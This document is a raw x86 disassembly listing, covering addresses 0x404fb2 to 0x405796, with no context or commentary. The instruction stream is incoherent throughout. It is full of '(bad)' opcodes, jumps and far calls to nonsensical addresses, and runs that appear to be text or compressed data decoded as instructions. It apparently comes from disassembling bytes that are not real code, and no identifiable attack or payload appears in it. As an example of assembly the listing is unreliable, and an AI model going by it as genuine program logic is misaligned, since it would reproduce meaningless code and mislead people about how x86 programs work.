  404fb2:	fmul   DWORD PTR [ebx]
  404fb4:	mov    ebp,0xd9e731e0
  404fb9:	jb     0x404f93
  404fbb:	and    ecx,DWORD PTR [edi-0x80]
  404fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fbf:	arpl   WORD PTR [ebp+0x4d6b],sp
  404fc5:	and    BYTE PTR [ebx+edi*2],al
  404fc8:	inc    ebx
  404fc9:	add    BYTE PTR [eax],al
  404fcb:	add    BYTE PTR [esi],bl
  404fcd:	lods   eax,DWORD PTR ds:[esi]
  404fce:	inc    eax
  404fcf:	cmp    al,0xba
  404fd1:	jmp    0x803aa4eb
  404fd6:	xor    al,0x9f
  404fd8:	ja     0x405020
  404fda:	xchg   eax,ebp
  404fdc:	mov    ecx,0x5c8b45d2
  404fe1:	je     0x404fe1
  404fe3:	xchg   ebx,eax
  404fe4:	(bad)  
  404fe6:	mov    edi,0xdd56c89
  404feb:	push   ecx
  404fec:	mov    esi,DWORD PTR [esi]
  404fee:	repz add BYTE PTR [eax],al
  404ff1:	pop    ecx
  404ff2:	stos   BYTE PTR es:[edi],al
  404ff3:	add    BYTE PTR [eax],al
  404ff5:	add    BYTE PTR [ebx-0x7c7c7c7d],al
  404ffb:	add    DWORD PTR [ebx+0x117f8383],0x7e
  405002:	inc    ebp
  405003:	inc    ebp
  405004:	inc    ebp
  405005:	inc    ebp
  405006:	inc    ebp
  405007:	inc    ebp
  405008:	inc    ebp
  405009:	inc    ebp
  40500a:	inc    ebp
  40500b:	mov    ecx,DWORD PTR [ebx+0x5eb111a1]
  405011:	out    0xf2,eax
  405013:	pop    ebx
  405014:	call   0xdbd:0x731d13e7
  40501b:	sbb    al,0x27
  40501d:	push   eax
  40501e:	lahf   
  40501f:	push   edi
  405020:	shr    BYTE PTR [edi-0x7f],cl
  405023:	repz out 0x8b,al
  405026:	mov    ebx,DWORD PTR [eax]
  405028:	aas    
  405029:	or     BYTE PTR [ebp-0x2f],bl
  40502c:	fbld   TBYTE PTR [eax]
  40502e:	xlat   BYTE PTR ds:[ebx]
  40502f:	retf   
  405030:	rcl    DWORD PTR [edi-0x1f38901a],cl
  405036:	aam    0x53
  405038:	mov    DWORD PTR [esi+0x2ddbb882],eax
  40503e:	lods   al,BYTE PTR ds:[esi]
  40503f:	inc    eax
  405040:	(bad)  
  405041:	and    BYTE PTR [ebx],ah
  405043:	pop    ebx
  405044:	mov    ecx,DWORD PTR [ebx-0x74935add]
  40504a:	mov    ecx,DWORD PTR [edi]
  40504c:	(bad)  
  40504d:	and    eax,0x8876048b
  405052:	stos   BYTE PTR es:[edi],al
  405053:	and    eax,0x771f93f5
  405058:	test   DWORD PTR [esi*1+0x7b897bf8],esp
  40505f:	pop    ebp
  405060:	retf   
  405061:	push   ebp
  405062:	imul   edx,eax,0xffffffca
  405065:	sbb    eax,0x40478e1
  40506a:	add    al,0x29
  40506c:	mov    WORD PTR [esp+eax*1],es
  40506f:	loopne 0x405018
  405071:	add    al,0x4
  405073:	add    al,0x50
  405075:	push   eax
  405076:	push   eax
  405077:	push   eax
  405078:	push   eax
  405079:	push   eax
  40507a:	push   eax
  40507b:	push   eax
  40507c:	push   eax
  40507d:	sbb    DWORD PTR [ecx+edi*1-0x11],esp
  405081:	pop    ss
  405082:	fadd   QWORD PTR [ebp-0xc3c6da8]
  405088:	mov    eax,0x8fa79d1c
  40508d:	xor    DWORD PTR [ebp+edx*2+0x24722d27],esp
  405094:	ja     0x405096
  405096:	add    BYTE PTR [eax],al
  405098:	add    BYTE PTR [eax],al
  40509a:	add    BYTE PTR [esi+0x62],dh
  40509d:	ds inc esp
  40509f:	bound  ebp,QWORD PTR [edi+0x62]
  4050a2:	dec    ebp
  4050a3:	outs   dx,DWORD PTR ds:[esi]
  4050a4:	jbe    0x4050fa
  4050a6:	and    ah,BYTE PTR [eax]
  4050a8:	jo     0x40511a
  4050aa:	cmp    al,0x72
  4050ac:	ins    DWORD PTR es:[edi],dx
  4050ad:	cs or  ax,0x6d20
  4050b2:	and    BYTE PTR [ecx+0x22],ch
  4050b5:	jbe    0x405129
  4050b7:	je     0x405110
  4050b9:	jne    0x40512d
  4050bb:	arpl   WORD PTR [ebp+0x3c],bp
  4050be:	gs push edx
  4050c0:	cs ins DWORD PTR es:[edi],dx
  4050c2:	push   ebx
  4050c3:	and    BYTE PTR [eax],ah
  4050c5:	je     0x40512c
  4050c7:	jne    0x40510c
  4050c9:	inc    esp
  4050ca:	cmp    al,0x43
  4050cc:	outs   dx,DWORD PTR ds:[esi]
  4050cd:	imul   ebp,DWORD PTR [ecx+0x6d],0x6d202069
  4050d4:	and    BYTE PTR [eax+0x22],dh
  4050d7:	ins    DWORD PTR es:[edi],dx
  4050d8:	jb     0x40514e
  4050da:	das    
  4050db:	je     0x4050fd
  4050dd:	and    BYTE PTR [edi+0x20],ch
  4050e0:	je     0x40511e
  4050e2:	popa   
  4050e3:	imul   esp,DWORD PTR [ebx+0x63],0x2f292e73
  4050ea:	add    BYTE PTR [eax],al
  4050ec:	add    BYTE PTR [eax],al
  4050ee:	add    BYTE PTR [edi-0x21],bh
  4050f1:	or     DWORD PTR [eax+eax*1+0x0],esi
  4050f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050f6:	call   0x3ac4:0x60df7fc5
  4050fd:	push   0xffffffed
  4050ff:	out    dx,eax
  405100:	sub    DWORD PTR [edi],esp
  405102:	out    0xa8,eax
  405104:	lds    ebx,FWORD PTR [edx+0x20]
  405107:	ret    0x7daa
  40510a:	in     eax,0xac
  40510c:	test   al,0x8f
  40510e:	adc    bh,dh
  405110:	out    0x65,eax
  405112:	rcr    DWORD PTR [esi],cl
  405114:	sub    bh,BYTE PTR [edx+0xd88c]
  40511a:	bound  edi,QWORD PTR [ecx]
  40511c:	add    BYTE PTR [eax],al
  40511e:	in     al,0x2a
  405120:	add    eax,0xfff48b00
  405125:	mov    ebp,ecx
  405127:	out    dx,al
  405128:	fcomp  QWORD PTR ss:[eax+ebp*1+0x31]
  40512d:	mov    ebp,DWORD PTR [ebp*8+0x439a24d4]
  405134:	pop    ebx
  405135:	and    bl,bh
  405137:	loop   0x405147
  405139:	xchg   BYTE PTR [edx-0x75],dh
  40513c:	mov    ecx,DWORD PTR [ebx+0x31bdbd69]
  405142:	and    BYTE PTR [ebx+0x55],0xc5
  405146:	pop    edx
  405147:	stos   DWORD PTR es:[edi],eax
  405148:	stc    
  405149:	ficom  DWORD PTR [eax]
  40514b:	repz jmp 0xb75:0xd8a6bef
  405153:	cmp    DWORD PTR [esi-0x59],esi
  405156:	(bad)  
  405157:	stos   BYTE PTR es:[edi],al
  405158:	mov    ch,0x12
  40515a:	mov    DWORD PTR [ebx-0x5a848e75],ecx
  405160:	mov    ecx,DWORD PTR [ebx+0x8b]
  405166:	add    BYTE PTR [eax],al
  405168:	add    BYTE PTR [eax],al
  40516a:	add    BYTE PTR [eax],al
  40516c:	into   
  40516d:	ror    esp,1
	...
  405177:	add    BYTE PTR [eax],al
  405179:	add    bh,al
  40517b:	stc    
  40517c:	iret   
  40517d:	mov    bh,0xb2
  40517f:	inc    esi
  405180:	sbb    ecx,edi
  405182:	test   al,0x8f
  405184:	xchg   edx,eax
  405185:	add    eax,0xc2d8976f
  40518a:	sbb    eax,0xc3e51f62
  40518f:	fcmovb st,st(2)
  405191:	ret    
  405192:	add    BYTE PTR [eax],al
  405194:	lods   eax,DWORD PTR ds:[esi]
  405195:	add    BYTE PTR ds:[eax],al
  405198:	cli    
  405199:	add    eax,DWORD PTR [eax]
  40519b:	add    BYTE PTR [ebx+ecx*4+0x15],dh
  40519f:	daa    
  4051a0:	push   cs
  4051a1:	call   0x2e121293
  4051a6:	pop    ebp
  4051a7:	add    edi,edx
  4051a9:	mov    eax,ds:0xb4f5317c
  4051ae:	adc    BYTE PTR [edi+0x5868c0bf],bl
  4051b4:	add    BYTE PTR [eax],al
  4051b6:	repnz mov bl,0x43
  4051b9:	sub    BYTE PTR [eax],al
  4051bb:	add    BYTE PTR [eax],al
  4051bd:	js     0x405154
  4051bf:	(bad)  
  4051c0:	sbb    al,0xde
  4051c2:	mov    ecx,0x9699c591
  4051c7:	push   es
  4051c8:	aam    0xbb
  4051ca:	mov    ebp,0x3382064e
  4051cf:	mov    ecx,0x7fba00c1
  4051d4:	data16 mov dl,0xed
  4051d7:	das    
  4051d8:	push   esi
  4051d9:	or     al,0xc0
  4051db:	mov    ecx,0xc82a5d0b
  4051e0:	add    BYTE PTR [eax],al
  4051e2:	clc    
  4051e3:	popf   
  4051e4:	add    BYTE PTR [eax],al
  4051e6:	add    BYTE PTR [ebx-0x74747475],cl
  4051ec:	mov    ecx,DWORD PTR [ebx-0x770c7475]
  4051f2:	scas   eax,DWORD PTR es:[edi]
	...
  4051fb:	add    BYTE PTR [eax],al
  4051fd:	add    BYTE PTR [edi-0x5a],al
  405200:	push   ebp
  405201:	adc    dh,dl
  405203:	pop    ecx
  405204:	js     0x40520d
  405206:	cld    
  405207:	dec    ebp
  405208:	outs   dx,BYTE PTR ds:[esi]
  405209:	cmp    al,BYTE PTR [esi]
  40520b:	mov    eax,0xc00cae6a
  405210:	pusha  
  405211:	sbb    al,0x7
  405213:	not    BYTE PTR [edi-0x1f]
  405216:	add    BYTE PTR [eax],al
  405218:	jmp    0x40526b
  40521a:	imul   edi,DWORD PTR [ecx-0x195b7e7d],0xffffffa9
  405221:	in     al,0x14
  405223:	in     al,dx
  405224:	mov    bh,0x4d
  405226:	push   edx
  405227:	test   al,0xbd
  405229:	stc    
  40522a:	fldcw  WORD PTR [ebx+0x17]
  40522d:	cwde   
  40522e:	jge    0x405219
  405230:	enter  0x564d,0x74
  405234:	inc    ebp
  405235:	add    BYTE PTR [eax],al
  405237:	add    esi,DWORD PTR [edi-0x1effff69]
  40523d:	push   ebx
  40523e:	scas   eax,DWORD PTR es:[edi]
  40523f:	add    BYTE PTR [edx-0x58],ch
  405242:	imul   BYTE PTR [edi]
  405244:	jns    0x4051fa
  405246:	jb     0x40520e
  405248:	dec    esp
  405249:	rcl    dh,cl
  40524b:	mov    ebp,0x5bc33f49
  405250:	enter  0x654a,0x1a
  405254:	fistp  QWORD PTR [esi-0x5a]
  405257:	cmp    BYTE PTR [ecx+0x6a],al
  40525a:	push   0x6a
  40525c:	jmp    0x6a60:0xc56a6a7b
  405263:	push   0x6a
	...
  40526d:	add    BYTE PTR [ecx],cl
  40526f:	pop    esp
  405270:	mov    ecx,DWORD PTR [edi]
  405272:	pop    ds
  405273:	jae    0x4052c8
  405275:	gs sar bh,0xea
  405279:	jle    0x4052e4
  40527b:	adc    ebp,esi
  40527d:	adc    ecx,ebx
  40527f:	jne    0x405273
  405281:	repnz ins BYTE PTR es:[edi],dx
  405283:	(bad)  
  405284:	fmulp  st(1),st
  405286:	(bad)  
  405287:	(bad)  
  405288:	(bad)  
  405289:	(bad)  
  40528a:	(bad)  
  40528b:	(bad)  
  40528c:	(bad)  
  40528d:	pfmul  mm1,QWORD PTR [ebp+0x72f89f8d]
  405295:	lea    ecx,[ebp+0x462336d3]
  40529b:	inc    ebp
  40529c:	mov    bh,0xba
  40529e:	ss out dx,al
  4052a0:	pop    ebx
  4052a1:	pop    eax
  4052a2:	push   0x67
  4052a4:	dec    esi
  4052a5:	jecxz  0x40531b
  4052a7:	push   ss
  4052a8:	icebp  
  4052a9:	loopne 0x405320
  4052ab:	inc    ebx
  4052ac:	cmp    eax,0xdffbf7e1
  4052b1:	jae    0x405257
  4052b3:	mov    ah,0xe0
  4052b5:	in     al,dx
  4052b6:	mul    WORD PTR [ebp-0x23727258]
  4052bd:	or     al,0x8d
  4052bf:	lea    edi,[edx+0x24]
  4052c2:	pop    edi
  4052c3:	lea    eax,[eax]
  4052c5:	(bad)  
  4052c6:	aad    0xd2
  4052c8:	je     0x405283
  4052ca:	jp     0x405302
  4052cc:	jl     0x405256
  4052ce:	mov    ebx,0xcddb0f
  4052d3:	jbe    0x405319
  4052d5:	push   ss
  4052d6:	std    
  4052d7:	ret    
  4052d8:	js     0x405290
  4052da:	mov    ebp,0xf2c3
  4052df:	add    BYTE PTR [edx+0x4c424c51],ch
  4052e5:	sbb    dl,dl
  4052e7:	fcmovb st,st(0)
  4052e9:	shl    BYTE PTR [ebx],1
  4052eb:	addr16 mov al,ds:0x478c
  4052ef:	neg    DWORD PTR [eax]
  4052f1:	dec    ebp
  4052f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052f3:	cmp    edi,ebp
  4052f5:	gs add eax,0xb349a237
  4052fb:	pop    eax
  4052fc:	xchg   ecx,eax
  4052fd:	add    BYTE PTR [eax],al
  4052ff:	inc    ebx
  405300:	stos   BYTE PTR es:[edi],al
  405301:	push   ebx
	...
  40530e:	retf   0x86e6
	...
  405319:	add    BYTE PTR [esp+eax*1],al
  40531c:	popa   
  40531d:	add    eax,0xb2f005e
  405322:	dec    eax
  405323:	fcom   st(3)
  405325:	mov    ebp,0xbe3adf3
  40532a:	push   0x9a2673c8
  40532f:	sbb    eax,eax
  405331:	pop    esp
  405332:	dec    eax
  405333:	pop    ecx
  405334:	add    al,0x69
  405336:	and    BYTE PTR [ebp+0x63],ah
  405339:	and    BYTE PTR [esi],ch
  40533b:	jb     0x405381
  40533d:	ins    DWORD PTR es:[edi],dx
  40533e:	and    BYTE PTR [edx+0x62],ah
  405341:	and    BYTE PTR ds:0x6f726d2e,cl
  405347:	jae    0x4053bf
  405349:	outs   dx,BYTE PTR gs:[esi]
  40534b:	ins    BYTE PTR es:[edi],dx
  40534c:	ins    DWORD PTR es:[edi],dx
  40534d:	dec    ecx
  40534e:	jb     0x4053bd
  405350:	or     eax,0x636f693e
  405355:	jo     0x4053cf
  405357:	arpl   WORD PTR [ebx+0x2e],si
  40535a:	bound  esp,QWORD PTR [ecx+0x57]
  40535d:	dec    ebp
  40535e:	jae    0x4053cd
  405360:	dec    ebp
  405361:	jb     0x4053a1
  405363:	fs cmp eax,0xa204d69
  405369:	arpl   WORD PTR [edi+0x61],sp
  40536c:	outs   dx,DWORD PTR ds:[esi]
  40536d:	and    BYTE PTR [ecx+0x65],ah
  405370:	jbe    0x4053e4
  405372:	cs jae 0x4053b6
  405375:	jbe    0x4053e7
  405377:	jne    0x405399
  405379:	cmp    cl,BYTE PTR gs:[ebp+0x73]
  40537d:	jb     0x4053e5
  40537f:	outs   dx,BYTE PTR ds:[esi]
  405380:	or     eax,0x79202044
  405385:	je     0x4053de
  405387:	cmp    eax,0x2e20722e
  40538c:	and    ah,BYTE PTR [ebp+0x64]
  40538f:	je     0x405409
  405391:	jae    0x405405
  405393:	bound  eax,QWORD PTR [edx+ecx*1+0x4]
  405397:	cmp    BYTE PTR [ebx+0x4],ch
  40539a:	add    al,0x1b
  40539c:	add    al,BYTE PTR [esp+eax*1]
  40539f:	mov    ds:0xba20d19a,al
  4053a4:	out    dx,eax
  4053a5:	jb     0x405329
  4053a7:	pop    edx
  4053a8:	fadd   DWORD PTR [ecx+0x77109501]
  4053ae:	cdq    
  4053af:	out    dx,eax
  4053b0:	les    eax,FWORD PTR [ecx-0x74]
  4053b3:	mov    esp,0x4d823f5
  4053b8:	add    ch,dl
  4053ba:	inc    ecx
  4053bb:	mov    esp,0xd6
  4053c0:	mov    al,ds:0x339a4096
  4053c5:	mov    ebp,0x8111cdfd
  4053ca:	cli    
  4053cb:	mov    al,ds:0x1d42b06f
  4053d0:	sub    DWORD PTR [edx+0x42],0x7af97f01
  4053d7:	retf   
  4053d8:	adc    eax,0x35d09bd9
  4053dd:	cld    
  4053de:	test   DWORD PTR [edx+ebx*4],ecx
  4053e1:	ins    BYTE PTR es:[edi],dx
  4053e2:	mov    dh,0x0
  4053e4:	add    ch,bh
  4053e6:	retf   
	...
  4053f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053f4:	xchg   DWORD PTR [ebp+0x45454545],esp
  4053fa:	inc    ebp
  4053fb:	inc    ebp
  4053fc:	inc    ebp
  4053fd:	inc    ebp
  4053fe:	inc    ebp
  4053ff:	add    BYTE PTR [eax],al
  405401:	pop    esp
  405402:	(bad)  
  405403:	or     al,0xa1
  405405:	adc    edi,esp
  405407:	pop    eax
  405408:	and    al,0x13
  40540a:	or     DWORD PTR [eax+0x65],0x53
  40540e:	dec    edi
  40540f:	jmp    0x40539c
  405411:	clc    
  405412:	sub    ebp,DWORD PTR [esp+ebx*2-0x59e9376c]
  405419:	add    BYTE PTR [eax],al
  40541b:	lods   eax,DWORD PTR ds:[esi]
  40541c:	mov    ebx,DWORD PTR [edi+0x57eeb1e2]
  405422:	cli    
  405423:	(bad)  
  405424:	and    dl,BYTE PTR [ebx+0x63]
  405427:	cmp    ch,bh
  405429:	adc    DWORD PTR [eax+0x7c],esi
  40542c:	pop    edx
  40542d:	or     cl,BYTE PTR fs:[ebp-0x1a16019e]
  405434:	sub    ecx,esi
  405436:	jecxz  0x4053e3
  405438:	add    BYTE PTR [eax],al
  40543a:	mov    WORD PTR [edx-0x50ffffb7],gs
  405440:	test   al,0x61
  405442:	add    BYTE PTR [eax],al
  405444:	imul   edi,DWORD PTR [eax+0xb],0x1f4931d6
  40544b:	stos   DWORD PTR es:[edi],eax
  40544c:	mov    al,ds:0xf984284b
  405451:	das    
  405452:	jl     0x405446
  405454:	push   edi
  405455:	mov    dl,0x46
  405457:	(bad)  
  405458:	(bad)  [edx]
  40545a:	inc    eax
  40545b:	mov    al,BYTE PTR [eax]
  40545d:	add    BYTE PTR [eax],al
  40545f:	jle    0x40543b
  405461:	add    BYTE PTR [eax],al
  405463:	popf   
  405464:	pop    edx
  405465:	add    BYTE PTR [eax],al
  405467:	add    bh,bh
  405469:	(bad)  
  40546a:	(bad)  
  40546b:	(bad)  
  40546c:	(bad)  
  40546d:	(bad)  
  40546e:	(bad)  
  40546f:	(bad)  
  405470:	(bad)  
  405471:	stc    
  405472:	rep stos BYTE PTR es:[edi],al
  405474:	(bad)  
  405475:	hlt    
  405476:	out    dx,al
  405477:	enter  0x47d2,0xee
  40547b:	repnz mov al,ds:0x24e78160
  405481:	cwde   
  405482:	mov    esi,0x58c77a0b
  405487:	lods   al,BYTE PTR ds:[esi]
  405488:	(bad)  
  405489:	jne    0x405500
  40548b:	jne    0x405502
  40548d:	jne    0x405504
  40548f:	jne    0x405506
  405491:	jne    0x40547b
  405493:	call   0x529c4005
  405498:	call   0x5df35e85
  40549d:	xchg   edx,eax
  40549e:	mov    ah,0xa0
  4054a0:	sbb    eax,0x676734ba
  4054a5:	scas   al,BYTE PTR es:[edi]
  4054a6:	fadd   st(6),st
  4054a8:	push   edx
  4054a9:	push   edx
  4054ab:	ja     0x405446
  4054ad:	xor    BYTE PTR [ebx+0x30],bl
  4054b0:	div    DWORD PTR [ebp+0x77208de9]
  4054b6:	cli    
  4054b7:	add    dl,al
  4054b9:	cs (bad) 
  4054bb:	rol    DWORD PTR [edx],1
  4054bd:	call   0xe8b952aa
  4054c2:	call   0xe900b841
  4054c7:	xor    edi,DWORD PTR [esi-0x36]
  4054ca:	dec    ecx
  4054cb:	sbb    cl,BYTE PTR [ecx+edi*8-0x30d8ad52]
  4054d2:	jp     0x40551a
  4054d4:	push   eax
  4054d5:	mov    DWORD PTR [eax],edi
  4054d7:	or     esp,esi
  4054d9:	cmc    
  4054da:	mov    dl,0x22
  4054dc:	mov    DWORD PTR [esi+0x3333058b],ecx
  4054e2:	xor    ebp,DWORD PTR [edx+0x2e19acbc]
  4054e8:	cmovnp esi,DWORD PTR [edi]
  4054eb:	iret   
  4054ec:	sub    BYTE PTR [ebx-0x3d],cl
  4054ef:	add    al,0x43
  4054f1:	test   BYTE PTR [eax],ch
  4054f3:	retf   
  4054f4:	sub    dh,BYTE PTR [edi+0x74]
  4054f7:	pop    esp
  4054f8:	(bad)  
  4054f9:	stc    
  4054fa:	iret   
  4054fb:	sub    DWORD PTR [esi+eax*2+0x33332709],ecx
  405502:	out    0x1e,al
  405504:	push   esi
  405505:	xor    esi,DWORD PTR [ebx]
  405507:	xor    ecx,DWORD PTR [esp+ecx*1]
  40550a:	or     al,0xc
  40550c:	or     al,0xc
  40550e:	or     al,0xc
  405510:	or     al,0xdb
  405512:	dec    esp
  405513:	scas   eax,DWORD PTR es:[edi]
  405514:	(bad)  
  405515:	(bad)  
  405516:	(bad)  
  405517:	(bad)  
  405518:	(bad)  
  405519:	(bad)  
  40551a:	(bad)  
  40551b:	(bad)  
  40551c:	(bad)  
  40551e:	add    al,0xd8
  405520:	sbb    al,0x57
  405522:	add    ch,ah
  405524:	xlat   BYTE PTR ds:[ebx]
  405525:	sti    
  405526:	dec    esp
  405527:	outs   dx,BYTE PTR ds:[esi]
  405528:	fbstp  TBYTE PTR ss:[eax+esi*4+0x40]
  40552d:	imul   edx,DWORD PTR [edi],0xe351a077
  405533:	lods   al,BYTE PTR ds:[esi]
  405534:	mov    eax,DWORD PTR [esi]
  405536:	out    dx,al
  405537:	add    al,0x4
  405539:	jmp    0x405555
  40553b:	add    al,0x4
  40553d:	call   0x20445a1a
  405542:	add    DWORD PTR [edi+ebx*8+0x75682bdf],edi
  405549:	inc    esp
  40554a:	imul   edi,esi,0xffffffde
  40554d:	xchg   ebx,eax
  40554e:	sar    DWORD PTR [eax],1
  405550:	ss scas eax,DWORD PTR es:[edi]
  405552:	dec    ecx
  405553:	and    BYTE PTR [edi+0x10],bh
  405556:	out    0x8,al
  405558:	gs add al,0x0
  40555b:	push   es
  40555c:	scas   eax,DWORD PTR es:[edi]
  40555d:	sub    DWORD PTR [esi+0x0],ecx
  405560:	add    BYTE PTR [eax],al
  405562:	jmp    0x40559e
  405564:	fisubr WORD PTR [eax-0x43]
  405567:	xchg   edx,eax
  405568:	int    0x8c
  40556a:	xor    bl,BYTE PTR [ebx]
  40556c:	in     al,0x90
  40556e:	mov    eax,ds:0x7b295056
  405573:	sbb    eax,0xd8cb94c7
  405578:	add    BYTE PTR [ecx-0x10c0fae],bh
  40557e:	les    ecx,FWORD PTR [edi-0x3110c431]
  405584:	jg     0x405586
  405586:	add    BYTE PTR [esi+0xa9],ah
  40558c:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  405593:	add    DWORD PTR [ebx+0x455bb0c0],0x45
  40559a:	inc    ebp
  40559b:	inc    ebp
  40559c:	inc    ebp
  40559d:	inc    ebp
  40559e:	inc    ebp
  40559f:	inc    ebp
  4055a0:	inc    ebp
  4055a1:	je     0x405617
  4055a3:	adc    esi,DWORD PTR [edi+0x1949910b]
  4055a9:	ds xchg ebp,eax
  4055ab:	fistp  QWORD PTR cs:[edx-0x1b]
  4055af:	bound  edx,QWORD PTR [edi]
  4055b1:	shl    BYTE PTR [edx],cl
  4055b3:	push   cs
  4055b4:	push   eax
  4055b5:	cdq    
  4055b6:	sbb    bh,BYTE PTR [ebp-0x3]
  4055b9:	aaa    
  4055ba:	and    eax,0x984b7474
  4055bf:	ss cmc 
  4055c1:	rcr    BYTE PTR [ebp+0x44],1
  4055c4:	rcr    DWORD PTR [ebp+0x38],cl
  4055c7:	nop
  4055c8:	cmp    al,0x3a
  4055ca:	cli    
  4055cb:	scas   al,BYTE PTR es:[edi]
  4055cc:	mov    bl,BYTE PTR [edx]
  4055ce:	xchg   BYTE PTR [edx-0x7],ah
  4055d1:	cld    
  4055d2:	and    dl,BYTE PTR [edx]
  4055d4:	out    0x81,al
  4055d6:	mov    bl,0x39
  4055d8:	cmp    DWORD PTR [ecx-0x7d1b8b8c],esp
  4055de:	or     esi,DWORD PTR [esp+esi*2+0x36]
  4055e2:	fst    DWORD PTR [edi+0x455b0074]
  4055e8:	test   esp,esi
  4055ea:	jb     0x405617
  4055ec:	ss mov dl,0x3c
  4055ef:	or     eax,0xfd60ecf3
  4055f4:	cmp    BYTE PTR [eax],0x76
  4055f7:	std    
  4055f8:	mov    WORD PTR [ebx-0xf],gs
  4055fb:	push   edx
  4055fc:	sbb    eax,0xbc
  405601:	xlat   BYTE PTR ds:[ebx]
  405602:	mov    es,WORD PTR [eax]
  405604:	add    BYTE PTR [ecx+esi*8],cl
  405607:	add    BYTE PTR [eax],al
  405609:	add    BYTE PTR [ebx-0x7c7c7c7d],al
  40560f:	add    DWORD PTR [ebx+0x473c8383],0xffffffa1
  405616:	jnp    0x405658
  405618:	out    dx,al
  405619:	rep lods eax,DWORD PTR ds:[esi]
  40561b:	jnp    0x40560b
  40561d:	mov    cl,0x59
  40561f:	and    DWORD PTR ds:0xe28937ad,edi
  405625:	xchg   edx,edi
  405627:	test   al,ch
  405629:	mov    ah,BYTE PTR [ecx+0x0]
	...
  405634:	add    BYTE PTR [eax],al
  405636:	pushf  
  405637:	cmp    ebp,DWORD PTR [ecx+edx*8+0x0]
  40563b:	add    dh,dh
  40563d:	add    BYTE PTR [edi+0x3d2f3d4],bl
  405643:	adc    DWORD PTR [ebx+ecx*4],ebp
  405646:	fisttp DWORD PTR [ebp-0x64213170]
  40564c:	rol    DWORD PTR [esi+0x2b],cl
  40564f:	ins    BYTE PTR es:[edi],dx
  405650:	sub    edx,0x29cc5de2
  405656:	test   al,0xbd
  405658:	push   ss
  405659:	repz add DWORD PTR ds:[edi+0x75],0xffffffec
  40565f:	add    BYTE PTR [eax],al
  405661:	call   0x8a4056a1
  405666:	push   edx
  405667:	js     0x405669
  405669:	jo     0x4056b8
  40566b:	and    ah,BYTE PTR [eax]
  40566d:	je     0x4056e1
  40566f:	gs push edi
  405671:	bound  esp,QWORD PTR [eax]
  405673:	ins    DWORD PTR es:[edi],dx
  405674:	or     eax,0x3e526976
  405679:	xor    DWORD PTR cs:[ebp+0x20],ebp
  40567d:	outs   dx,BYTE PTR ds:[esi]
  40567e:	inc    ebx
  40567f:	arpl   WORD PTR [esi+0x63],si
  405682:	dec    ebp
  405683:	gs push ebx
  405685:	bound  ebp,QWORD PTR [ecx+0xa]
  405688:	inc    esp
  405689:	jo     0x4056d8
  40568b:	cmp    al,0x23
  40568d:	outs   dx,DWORD PTR ds:[esi]
  40568e:	addr16 jae 0x4056b1
  405691:	ins    DWORD PTR es:[edi],dx
  405692:	outs   dx,DWORD PTR ds:[esi]
  405693:	ins    DWORD PTR es:[edi],dx
  405694:	popa   
  405695:	jb     0x4056f8
  405697:	and    BYTE PTR [esi+0x73],dh
  40569a:	and    BYTE PTR [ebp+0x76],ah
  40569d:	cmp    eax,0x426c654d
  4056a2:	jb     0x405707
  4056a4:	cs jbe 0x40570a
  4056a7:	imul   eax,DWORD PTR [ecx+0x67],0xfb17d28b
  4056ae:	retf   
  4056af:	jbe    0x40564f
  4056b1:	stos   DWORD PTR es:[edi],eax
  4056b2:	xor    edi,DWORD PTR [edi]
  4056b4:	test   al,0xb5
  4056b6:	jne    0x40571f
  4056b8:	shl    DWORD PTR [ebx+0x8d10541],1
  4056be:	mov    ds:0xd627d442,al
  4056c3:	mov    ecx,DWORD PTR [ebx+0x77d0ce8b]
  4056c9:	out    dx,eax
  4056ca:	fbld   TBYTE PTR [ecx+0x18]
  4056cd:	inc    edi
  4056ce:	push   0xffffff8d
  4056d0:	push   0xebdad2e3
  4056d5:	xor    bl,cl
  4056d7:	cld    
  4056d8:	push   edi
  4056d9:	add    DWORD PTR [esi-0x47],eax
  4056dc:	mov    ah,0x5a
  4056de:	dec    eax
  4056df:	jno    0x405741
  4056e1:	add    cl,bh
  4056e3:	mov    ecx,DWORD PTR [ebx-0x747af800]
  4056e9:	mov    ecx,DWORD PTR [ebx+0x0]
  4056ef:	add    BYTE PTR [eax],al
  4056f1:	add    BYTE PTR [eax],al
  4056f3:	add    BYTE PTR [ebp+ebp*1+0x34],ch
  4056f7:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  4056fe:	add    DWORD PTR [ebx+0x26af0000],0x5e
  405705:	or     ah,BYTE PTR ds:0x3bb1dbd6
  40570b:	in     al,dx
  40570c:	dec    ebx
  40570d:	and    ch,BYTE PTR ds:0x2cd806d1
  405713:	lea    eax,[bp+si]
  405716:	out    0x62,eax
  405718:	mov    dl,ah
  40571a:	add    BYTE PTR [eax],al
  40571c:	sbb    DWORD PTR [eax],esi
  40571e:	add    BYTE PTR [eax],al
  405720:	push   0xe2000041
  405725:	loope  0x4056d6
  405727:	ds loope 0x4056f1
  40572a:	add    cl,BYTE PTR [ebx]
  40572c:	inc    ebp
  40572d:	mov    eax,ds:0x26686ecc
  405732:	mov    cl,0xa7
  405734:	jg     0x4057a4
  405736:	icebp  
  405737:	cmp    DWORD PTR [edx+0x63bd14],ebp
  40573d:	mov    esi,DWORD PTR [ecx-0x74ea595d]
  405743:	mov    ecx,DWORD PTR [ebx+0x262eebb9]
  405749:	push   ds
  40574a:	push   ds
  40574b:	int    0x16
  40574d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40574e:	out    dx,al
  40574f:	clc    
  405750:	xor    DWORD PTR [edi],ecx
  405752:	cmp    esi,DWORD PTR [edi-0x51731d5]
  405758:	or     eax,0x2b624c97
  40575d:	jmp    0xe544180e
  405762:	(bad)  
  405763:	out    0x1e,al
  405765:	sbb    BYTE PTR [ecx-0x65747435],cl
  40576b:	sti    
  40576c:	mov    ecx,DWORD PTR [ebx-0x74747475]
  405772:	mov    ecx,DWORD PTR [ebx-0x74747475]
  405778:	out    0x36,al
  40577a:	js     0x40577c
	...
  405784:	add    BYTE PTR [eax],al
  405786:	loop   0x4057f2
  405788:	push   es
  405789:	fisttp DWORD PTR [ebx+0x59]
  40578c:	aam    0xad
  40578e:	ficomp WORD PTR [esi+0xd]
  405791:	stos   DWORD PTR es:[edi],eax
  405792:	loop   0x4057d9
  405794:	sub    al,0xec
  405796:	(bad)  
